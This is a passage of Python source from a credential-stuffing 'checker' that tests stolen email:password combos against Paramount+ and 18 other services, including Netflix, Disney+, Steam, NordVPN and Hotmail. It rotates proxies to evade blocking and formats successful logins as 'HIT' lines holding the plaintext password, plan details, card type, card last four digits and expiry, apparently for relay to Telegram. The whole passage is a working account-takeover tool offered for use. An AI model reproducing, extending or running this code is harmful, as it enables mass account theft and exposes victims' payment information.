        subs = self._fetch_subs(proxy) or {}
        sub_user = (subs.get("result") or {}).get("user") or {}
        sub_svod = sub_user.get("svod") or {}
        sub_packages = sub_svod.get("packages") or []
        sub_pkg = sub_packages[0] if sub_packages else pkg

        package_code = (sub_pkg.get("code") or pkg.get("code") or "").strip()
        package_status = (sub_pkg.get("status") or pkg.get("status") or "").strip()
        package_status_raw = (sub_svod.get("package_status_raw")
                              or svod.get("package_status_raw") or "").strip()
        package_source = (sub_pkg.get("source") or pkg.get("source") or "").strip()

        on_trial = bool(sub_pkg.get("on_trial") if sub_pkg else pkg.get("on_trial"))

        country = (sub_svod.get("userRegistrationCountry")
                   or svod.get("userRegistrationCountry")
                   or profile.get("country") or "US").strip()

        card_type = (billing_info.get("cardType") or "").strip()
        last_four = (billing_info.get("lastFour") or "").strip()
        exp_month = billing_info.get("cardExpMonth") or ""
        exp_year = billing_info.get("cardExpYear") or ""
        is_card = bool(billing_info.get("isTypeCard"))
        is_paypal = bool(billing_info.get("isTypePaypal"))
        is_gift = bool(billing_info.get("isTypeGift"))

        if is_card:
            payment_method = f"Card {card_type}".strip() if card_type else "Card"
        elif is_paypal:
            payment_method = "PayPal"
        elif is_gift:
            payment_method = "Gift"
        else:
            payment_method = "No Payment"

        if exp_month and exp_year:
            try:
                mm = int(str(exp_month).zfill(2))
                yy = str(exp_year)
                card_expiry = f"{mm:02d}/{yy}"
            except Exception:
                card_expiry = "No Card"
        else:
            card_expiry = "No Card"

        card_type_out = card_type if card_type else "No Card"
        last_four_out = last_four if last_four else "No Card"

        account_expiry, _ = _hunt_plan_end(billing, subs, user)
        if not account_expiry:
            src_lower = package_source.lower()
            if 'apple' in src_lower:
                account_expiry = 'Managed by Apple'
            elif 'google' in src_lower:
                account_expiry = 'Managed by Google'
            elif 'roku' in src_lower or 'amazon' in src_lower:
                account_expiry = 'Managed by Vendor'
            else:
                account_expiry = 'No Renewal'

        price_raw = _hunt_price(billing, subs, user)
        currency = _hunt_currency(billing, subs, user) or "USD"
        has_price = bool(price_raw and float(price_raw) > 0)
        price_out = f"{currency} {price_raw}" if has_price else "-"

        is_free = package_code.upper() == "NEW_FREE_PACKAGE"
        subscriber = not is_free

        kids = (profile.get("profile_type") or "").upper() == "KIDS"

        result = {
            "email": profile.get("email") or email,
            "user_id": body.get("userId"),
            "reg_id": user.get("regID"),
            "display_name": user.get("displayName") or "",
            "first_name": profile.get("first_name") or "",
            "last_name": profile.get("last_name") or "",
            "profile_type": profile.get("profile_type") or "",
            "country": country or "US",
            "package_code": package_code,
            "package_status": package_status or package_status_raw or "UNKNOWN",
            "package_status_raw": package_status_raw or package_status,
            "package_source": package_source,
            "plan_tier": (sub_pkg.get("plan_tier") or pkg.get("plan_tier") or "standard"),
            "on_trial": on_trial,
            "holding_state": sub_pkg.get("holding_state") or pkg.get("holding_state") or "OK",
            "is_subscriber": subscriber,
            "is_free": is_free,
            "ad_free": bool(entitlement.get("adFree")) or "AD_FREE" in package_code.upper(),
            "card_type": card_type_out,
            "last_four": last_four_out,
            "card_expiry": card_expiry,
            "payment_method": payment_method,
            "price": price_out,
            "account_expiry": account_expiry,
            "kids": kids,
        }

        if DEBUG:
            print("\n--- debug ---")
            print(f"    package_code: {package_code}")
            print(f"    package_source: {package_source}")
            print(f"    package_status: {package_status}")
            print(f"    package_status_raw: {package_status_raw}")
            print(f"    has_price: {has_price}")
            print(f"    is_free: {is_free}")
            print(f"    subscriber: {subscriber}")
            print(f"    account_expiry: {account_expiry}")

        return {"status": "valid", "error_type": None,
                "message": "Login successful", "user": result}




class ParamountChecker:
    """Bot-facing Paramount+ checker with native hit format."""

    def __init__(self, proxy=None):
        self.proxy = proxy
        self.core = _ParamountCore()

    def check(self, email, password, proxy=None):
        p = proxy or self.proxy
        try:
            result = self.core.check(email, password, p)
        except Exception as e:
            return {"status": "error", "message": str(e)[:100]}

        status = str(result.get("status", "error")).lower()
        if status == "bad":
            return {"status": "bad", "message": result.get("message") or "Invalid credentials"}
        if status != "valid":
            err = str(result.get("error_type") or "")
            msg = str(result.get("message") or err or "error")
            if err == "no_tk_trp" or "no_tk_trp" in msg:
                msg = "no_tk_trp — use US/allowed-region proxy (sign-in page blocked on this IP)"
            elif err == "block" or "signin: block" in msg:
                msg = "blocked by Paramount — use residential/US proxy"
            elif err == "proxy":
                msg = "proxy error — switch proxy"
            return {"status": "error", "message": msg}

        u = result.get("user") or {}
        is_free = bool(u.get("is_free"))
        out_status = "free" if is_free else "premium"

        def s(v):
            return clean_val(v, "-")

        plan = s(u.get("package_code"))
        pkg_status = s(u.get("package_status_raw") or u.get("package_status"))
        tier = s(u.get("plan_tier"))
        price = s(u.get("price"))
        country = format_country(u.get("country") or u.get("country_code") or "")
        payment = s(u.get("payment_method"))
        card = s(u.get("card_type"))
        last4 = s(u.get("last_four"))
        card_exp = s(u.get("card_expiry"))
        acct_exp = s(u.get("account_expiry"))
        trial = str(u.get("on_trial", False)).lower()
        subscriber = str(u.get("is_subscriber", False)).lower()
        adfree = str(u.get("ad_free", False)).lower()
        kids = str(u.get("kids", False)).lower()

        title = (
            f"{E('success')} <b>HIT</b> — Paramount+ {E('gem')}"
            if not is_free
            else f"{E('unlock')} <b>FREE</b> — Paramount+ {E('star')}"
        )
        lines = [
            title,
            "",
            f"{E('mail')} <b>Account</b> ➜ <code>{email}:{password}</code>",
            f"{E('ok1')} <b>Status</b> ➜ {pkg_status}",
            f"{E('spark')} <b>Plan</b> ➜ {plan}",
            f"{E('star')} <b>Tier</b> ➜ {tier}",
            f"{E('cash')} <b>Price</b> ➜ {price}",
            f"{E('bolt')} <b>Trial</b> ➜ {trial}",
            f"{E('success')} <b>Subscriber</b> ➜ {subscriber}",
            f"{E('fire')} <b>AdFree</b> ➜ {adfree}",
            f"{E('world')} <b>Country</b> ➜ {country}",
            f"{E('card')} <b>Payment</b> ➜ {payment}",
            f"{E('card')} <b>Card</b> ➜ {card}",
            f"{E('pin')} <b>Last4</b> ➜ {last4}",
            f"{E('time')} <b>Card Expiry</b> ➜ {card_exp}",
            f"{E('cal')} <b>Account Expiry</b> ➜ {acct_exp}",
            f"{E('teddy')} <b>Kids</b> ➜ {kids}",
            "",
            f"{E('crown')} <b>Made By</b> ➜ {PARAMOUNT_AUTHOR}",
        ]
        cleaned = []
        for ln in lines:
            if not ln:
                cleaned.append(ln)
                continue
            low = ln.lower()
            if ("➜ -" in low or "➜ n/a" in low) and "account" not in low and "made by" not in low:
                continue
            cleaned.append(ln)
        hit_text = "\n".join(cleaned)
        zip_line = format_zip_style_hit(email, password, {
            "status": out_status,
            "package_status": pkg_status,
            "plan": plan,
            "plan_base": plan,
            "tier": tier,
            "price": price,
            "on_trial": trial,
            "is_subscriber": subscriber,
            "ad_free": adfree,
            "country": u.get("country") or "",
            "payment": payment,
            "card_type": card,
            "card_last4": last4,
            "card_expiry": card_exp,
            "expires": acct_exp,
            "kids": kids,
        }, "Paramount+")

        return {
            "status": out_status,
            "zip_line": zip_line,
            "hit_line": zip_line,
            "message": "Subscriber" if not is_free else "Free account",
            "plan": plan,
            "plan_base": plan,
            "country": u.get("country") or "",
            "payment": payment,
            "price": price,
            "expires": acct_exp,
            "user": s(u.get("display_name") or u.get("first_name") or ""),
            "hit_text": hit_text,
            "package_status": pkg_status,
            "on_trial": trial,
            "ad_free": adfree,
            "card_type": card,
            "card_last4": last4,
            "is_subscriber": subscriber,
            "checked_by": PARAMOUNT_AUTHOR,
        }



class MultiChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.checkers = {
            "dazn": DAZNChecker(proxy),
            "deezer": DeezerChecker(proxy),
            "disney": DisneyChecker(proxy),
            "hotspotshield": HotspotShieldChecker(proxy),
            "nordvpn": NordVPNChecker(proxy),
            "steam": SteamChecker(proxy),
            "expressvpn": ExpressVPNChecker(proxy),
            "crunchyroll": CrunchyrollChecker(proxy),
            "xbox": XboxChecker(proxy),
            "hotmail": HotmailChecker(proxy),
            "nba": NBAChecker(proxy),
            "paramount": ParamountChecker(proxy),
            "netflix": NetflixChecker(proxy),
            "pluto": PlutoChecker(proxy),
            "plex": PlexChecker(proxy),
            "peacock": PeacockChecker(proxy),
            "makemusic": MakeMusicChecker(proxy),
            "tabii": TabiiChecker(proxy),
            "playabl": PlayablChecker(proxy),
        }

    def check(self, email: str, password: str) -> Dict:
        results = {}
        for name, checker in self.checkers.items():
            try:
                result = checker.check(email, password)
                status = result.get('status', 'error')
                if status in ['hit', 'premium', 'HIT']:
                    status = 'premium'
                elif status in ['free', 'FREE']:
                    status = 'free'
                elif status in ['bad', 'BAD', 'invalid']:
                    status = 'bad'
                elif status == '2fa':
                    status = '2fa'
                else:
                    status = 'error'
                results[name] = {'status': status, 'message': result.get('message', '')}
            except Exception as e:
                results[name] = {'status': 'error', 'message': str(e)[:80]}
        overall = 'bad'
        if any(r['status'] == 'premium' for r in results.values()):
            overall = 'premium'
        elif any(r['status'] == '2fa' for r in results.values()):
            overall = '2fa'
        elif any(r['status'] == 'free' for r in results.values()):
            overall = 'free'
        elif any(r['status'] == 'error' for r in results.values()):
            overall = 'error'
        return {'status': overall, 'results': results}

# ----- Helper Crypto for ExpressVPN (embedded) -----
class AesCryptographyService:
    def decrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(data) + decryptor.finalize()
        unpadder = PKCS7(128).unpadder()
        unpadded = unpadder.update(decrypted) + unpadder.finalize()
        return unpadded

    def encrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        padder = PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        return encryptor.update(padded) + encryptor.finalize()

class CryptoHelper:
    @staticmethod
    def get_byte_array(size: int) -> bytes:
        return os.urandom(size)

    @staticmethod
    def compute_signature(data: bytes, key: bytes) -> str:
        return base64.b64encode(hmac.new(key, data, hashlib.sha1).digest()).decode('ascii')

    @staticmethod
    def gzip_data(input_str: str) -> bytes:
        return gzip.compress(input_str.encode('ascii'), compresslevel=9)

    @staticmethod
    def envelope_encrypt(data: bytes, cert_base64: str) -> bytes:
        cert_der = base64.b64decode(cert_base64)
        cert = x509.Certificate.load(cert_der)
        aes_key = os.urandom(16)
        iv = os.urandom(16)
        aes_service = AesCryptographyService()
        encrypted_content = aes_service.encrypt(data, aes_key, iv)
        crypto_cert = crypto_x509.load_der_x509_certificate(cert_der)
        public_key = crypto_cert.public_key()
        encrypted_key = public_key.encrypt(aes_key, asym_padding.PKCS1v15())
        recipient_info = cms.RecipientInfo({
            'ktri': cms.KeyTransRecipientInfo({
                'version': cms.CMSVersion(0),
                'rid': cms.RecipientIdentifier({
                    'issuer_and_serial_number': cms.IssuerAndSerialNumber({
                        'issuer': cert['tbs_certificate']['issuer'],
                        'serial_number': cert['tbs_certificate']['serial_number']
                    })
                }),
                'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({
                    'algorithm': '1.2.840.113549.1.1.1',
                    'parameters': core.Null()
                }),
                'encrypted_key': encrypted_key
            })
        })
        enveloped_data = cms.EnvelopedData({
            'version': cms.CMSVersion(0),
            'recipient_infos': cms.RecipientInfos([recipient_info]),
            'encrypted_content_info': cms.EncryptedContentInfo({
                'content_type': '1.2.840.113549.1.7.1',
                'content_encryption_algorithm': cms.EncryptionAlgorithm({
                    'algorithm': '2.16.840.1.101.3.4.1.2',
                    'parameters': iv
                }),
                'encrypted_content': encrypted_content
            })
        })
        content_info = cms.ContentInfo({
            'content_type': '1.2.840.113549.1.7.3',
            'content': enveloped_data
        })
        return content_info.dump()





def _cli_kind_from_result(result):
    if not result or not isinstance(result, dict):
        return "error", "no result"
    st = str(result.get("status", "")).lower()
    msg = str(result.get("message") or result.get("error") or st)
    if st in ("premium", "hit", "valid", "success"):
        return "hit", msg
    if st in ("free", "expired"):
        return "free", msg
    if st in ("bad", "invalid", "ban"):
        return "bad", msg
    if st == "2fa":
        return "bad", "2fa: " + msg
    if st in ("error", "retry", "timeout", "rate_limit", "block"):
        return "retry" if st in ("retry", "timeout", "rate_limit", "block") else "error", msg
    return "error", msg


def _format_result_line(email, password, result, tool):
    r = result or {}
    # prefer zip_line / hit_line / hit_text first line
    for k in ("zip_line", "hit_line"):
        if r.get(k):
            return str(r[k])
    # compact fields
    def s(v):
        if v is None or v == "":
            return "-"
        v = str(v).strip()
        return "-" if v.upper() in ("N/A", "NONE", "NULL") else v
    plan = s(r.get("plan") or r.get("premium_type") or r.get("offer_name") or r.get("plan_base"))
    status = s(r.get("message") or r.get("status"))
    country = s(r.get("country") or r.get("cc"))
    streams = s(r.get("streams") or r.get("max_stream") or r.get("device_limit"))
    expiry = s(r.get("expires") or r.get("expiration_date") or r.get("expiry_date"))
    payment = s(r.get("payment") or r.get("payment_method"))
    return (
        f"{email}:{password} | Status:{status} | Plan:{plan} | Streams:{streams} | "
        f"Expiry:{expiry} | Country:{country} | Payment:{payment} | by {AUTHOR}"
    )


def wrap_checker(cls, tool_name):
    """Adapt bot Checker.check(email, password, proxy=None) -> (kind, line)."""
    inst = cls(None) if True else None

    def _check(email, password, proxy=None):
        try:
            obj = cls(proxy) if "proxy" in (cls.__init__.__code__.co_varnames if hasattr(cls.__init__, "__code__") else ()) else cls()
        except TypeError:
            try:
                obj = cls(proxy)
            except Exception:
                obj = cls()
        try:
            # ParamountChecker / NBAChecker / most: check(email, password, proxy)
            if hasattr(obj, "check"):
                import inspect
                sig = inspect.signature(obj.check)
                params = list(sig.parameters.keys())
                if "proxy" in params:
                    result = obj.check(email, password, proxy)
                else:
                    result = obj.check(email, password)
            else:
                return "error", f"{email}:{password} | no check method"
        except Exception as e:
            return "retry", f"{email}:{password} | {str(e)[:100]}"

        # already tuple from CLI-style
        if isinstance(result, tuple) and len(result) == 2 and result[0] in ("hit", "free", "bad", "retry", "error"):
            return result
        if not isinstance(result, dict):
            return "error", f"{email}:{password} | {str(result)[:80]}"
        kind, _ = _cli_kind_from_result(result)
        line = _format_result_line(email, password, result, tool_name)
        if kind == "error":
            low = (str(line) + " " + str(result.get("message", ""))).lower()
            soft = (
                "timeout", "network", "connection", "proxy", "ssl", "rate", "429",
                "502", "503", "504", "empty", "blocked", "json", "retry", "not defined",
                "incomplete", "refused", "unreachable", "cloudflare",
            )
            if any(k in low for k in soft):
                kind = "retry"
        return kind, line

    return _check



class AllCheckersMulti:
    """Run ALL service checkers on one combo; hit if any premium/hit."""

    def __init__(self):
        self.specs = [
            ("DAZN", DAZNChecker),
            ("Deezer", DeezerChecker),
            ("Disney+", DisneyChecker),
            ("HotspotShield", HotspotShieldChecker),
            ("NordVPN", NordVPNChecker),
            ("Steam", SteamChecker),
            ("ExpressVPN", ExpressVPNChecker),
            ("Crunchyroll", CrunchyrollChecker),
            ("Xbox", XboxChecker),
            ("Hotmail", HotmailChecker),
            ("NBA", NBAChecker),
            ("Paramount+", ParamountChecker),
            ("Netflix", NetflixChecker),
            ("Pluto TV", PlutoChecker),
            ("Plex", PlexChecker),
            ("Peacock", PeacockChecker),
            ("MakeMusic", MakeMusicChecker),
            ("Tabii", TabiiChecker),
            ("Playabl", PlayablChecker),
        ]

    def check(self, email, password, proxy=None):
        parts = []
        hit_details = []
        overall = "bad"
        for name, cls in self.specs:
            fn = wrap_checker(cls, name)
            try:
                kind, line = fn(email, password, proxy)
            except Exception as e:
                kind, line = "error", f"{email}:{password} | {name}:{str(e)[:50]}"
            parts.append(f"[{name}:{kind}]")
            if kind == "hit":
                overall = "hit"
                # keep full capture line from checker
                hit_details.append(f"--- {name} ---\n{line}")
            elif kind == "free" and overall not in ("hit",):
                overall = "free"
            elif kind in ("retry", "error") and overall == "bad":
                overall = kind
        if hit_details:
            summary = f"{email}:{password} | " + " ".join(parts) + "\n" + "\n".join(hit_details) + f"\n| by {AUTHOR}"
        else:
            summary = f"{email}:{password} | " + " ".join(parts) + f" | by {AUTHOR}"
        return overall, summary



TOOLS = [
    ("1", "DAZN", "dazn"),
    ("2", "Deezer", "deezer"),
    ("3", "Disney+", "disney"),
    ("4", "Hotspot Shield", "hotspotshield"),
    ("5", "NordVPN", "nordvpn"),
    ("6", "Steam", "steam"),
    ("7", "ExpressVPN", "expressvpn"),
    ("8", "Crunchyroll", "crunchyroll"),
    ("9", "Xbox", "xbox"),
    ("10", "Hotmail", "hotmail"),
    ("11", "NBA", "nba"),
    ("12", "Paramount+", "paramount"),
    ("13", "Netflix", "netflix"),
    ("14", "Pluto TV", "pluto"),
    ("15", "Plex", "plex"),
    ("16", "Peacock", "peacock"),
    ("17", "MakeMusic", "makemusic"),
    ("18", "Tabii", "tabii"),
    ("19", "Playabl", "playabl"),
    ("20", "MULTI (all 19 together)", "multi"),
]

CLASS_MAP = {
    "dazn": ("DAZN", "DAZNChecker"),
    "deezer": ("Deezer", "DeezerChecker"),
    "disney": ("Disney+", "DisneyChecker"),
    "hotspotshield": ("HotspotShield", "HotspotShieldChecker"),
    "nordvpn": ("NordVPN", "NordVPNChecker"),
    "steam": ("Steam", "SteamChecker"),
    "expressvpn": ("ExpressVPN", "ExpressVPNChecker"),
    "crunchyroll": ("Crunchyroll", "CrunchyrollChecker"),
    "xbox": ("Xbox", "XboxChecker"),
    "hotmail": ("Hotmail", "HotmailChecker"),
    "nba": ("NBA", "NBAChecker"),
    "paramount": ("Paramount+", "ParamountChecker"),
    "netflix": ("Netflix", "NetflixChecker"),
    "pluto": ("Pluto TV", "PlutoChecker"),
    "plex": ("Plex", "PlexChecker"),
    "peacock": ("Peacock", "PeacockChecker"),
    "makemusic": ("MakeMusic", "MakeMusicChecker"),
    "tabii": ("Tabii", "TabiiChecker"),
    "playabl": ("Playabl", "PlayablChecker"),
}


def run_tool(key):
    if key == "multi":
        name, chk = "MULTI-ALL", AllCheckersMulti()
        combos, proxies, threads = cli_bootstrap(name)
        run_pool(combos, proxies, threads, lambda e, p, x: chk.check(e, p, x), name)
        return
    if key not in CLASS_MAP:
        err("Unknown tool")
        return
    name, cls_name = CLASS_MAP[key]
    cls = globals().get(cls_name)
    if cls is None:
        err(f"Checker class missing: {cls_name}")
        return
    fn = wrap_checker(cls, name)
    combos, proxies, threads = cli_bootstrap(name)
    run_pool(combos, proxies, threads, fn, name)


def main():
    banner("FULL CHECKERS ALL-IN-ONE — 19 + MULTI")
    if tg_enabled():
        ok("Telegram enabled")
    else:
        warn("Set TG_BOT_TOKEN and TG_CHAT_ID at top of this file")
    print(c("  Select checker:", Fore.CYAN))
    for num, title, _ in TOOLS:
        print(c(f"  [{num}] ", Fore.GREEN) + title)
    print(c("  [0] Exit", Fore.RED))
    choice = ask("Choice: ")
    if choice in ("0", ""):
        return
    for num, title, key in TOOLS:
        if choice == num:
            ok(f"Starting {title}…")
            run_tool(key)
            return
    err("Invalid choice")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")
